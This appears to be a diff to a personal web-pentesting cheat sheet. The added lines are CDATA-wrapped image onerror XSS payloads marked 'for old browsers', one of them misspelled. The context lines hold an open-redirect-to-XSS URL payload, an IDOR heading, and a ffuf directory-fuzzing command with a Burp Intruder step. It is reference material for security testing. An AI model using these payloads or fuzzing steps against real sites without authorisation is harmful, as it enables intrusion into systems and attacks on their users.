@@ -489,6 +489,10 @@ Escalate to XSS
 /login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain --> xss pop-up
 
 
+for old browsers 
+<![CDATA[<img src="broken" onerro"alert(1)">]]>
+<![CDATA[><img src="broken" onerror="alert(1)">]]>
+
 
 ------------------------------------------------------------
 IDOR :: 
@@ -614,7 +618,7 @@ c templates concurrent
   27- ffuf -u https://example.com/v1/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php -recusrion 
   28- open burpsuite and send to intruder and $GET$ then select payloads from library => http verbs
        
-       
+   
        
        
        
